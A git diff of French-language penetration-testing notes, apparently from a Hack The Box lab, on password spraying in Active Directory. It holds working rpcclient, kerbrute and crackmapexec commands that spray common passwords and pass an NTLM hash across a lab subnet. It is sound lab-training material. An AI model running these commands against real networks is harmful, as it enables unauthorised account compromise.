@@ -14,7 +14,7 @@ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;qu
 
 {% code overflow="wrap" fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
 {% endcode %}
 
@@ -24,7 +24,7 @@ We can also use `Kerbrute` for the same attack as discussed previously.
 
 {% code overflow="wrap" fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
 
 ```
 {% endcode %}
@@ -33,7 +33,7 @@ mrroboteLiot@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.1
 
 {% code overflow="wrap" fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 ```
 {% endcode %}
 
@@ -43,7 +43,7 @@ After getting one (or more!) hits with our password spraying attack, we can then
 
 {% code fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
 ```
 {% endcode %}
 
@@ -51,21 +51,14 @@ mrroboteLiot@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password
 
 ### <mark style="color:red;">Local Administrator Password Reuse</mark>
 
-Le **password spraying** interne permet d’utiliser un même mot de passe sur plusieurs machines, notamment pour les comptes administrateurs locaux. Cela est possible si un attaquant a accès au **hachage NTLM** ou au mot de passe en clair de l'administrateur local.
-
-Les administrateurs utilisent souvent le même mot de passe pour plusieurs machines, ce qui rend ce type d'attaque efficace. Les outils comme **CrackMapExec** permettent de tester ce mot de passe sur plusieurs machines sans risquer de **verrouiller les comptes** en raison de trop nombreuses tentatives échouées.
-
-L'attaquant peut aussi trouver des **comptes avec des mots de passe réutilisés**, par exemple un administrateur local dont le mot de passe pourrait être réutilisé pour un compte utilisateur de domaine similaire.
-
-Parfois, un hachage NTLM est récupéré, et l'attaquant peut alors essayer ce hachage sur tout un sous-réseau pour vérifier si d'autres machines ont le même mot de passe.
-
-**CrackMapExec** offre une option de **connexion unique** pour éviter de bloquer des comptes en raison de tentatives échouées multiples. Cela permet de tester des mots de passe sur un grand nombre de machines sans risque d'alerte.
+Le **password spraying interne** consiste à tester un **même mot de passe (ou hachage NTLM)** sur plusieurs machines.\
+Comme les administrateurs locaux réutilisent souvent le même mot de passe, un attaquant peut exploiter cette faiblesse avec des outils comme **CrackMapExec**, qui permettent de vérifier de nombreux systèmes sans bloquer les comptes.
 
 <mark style="color:green;">**Local Admin Spraying with CrackMapExec**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 ```
 {% endcode %}
 
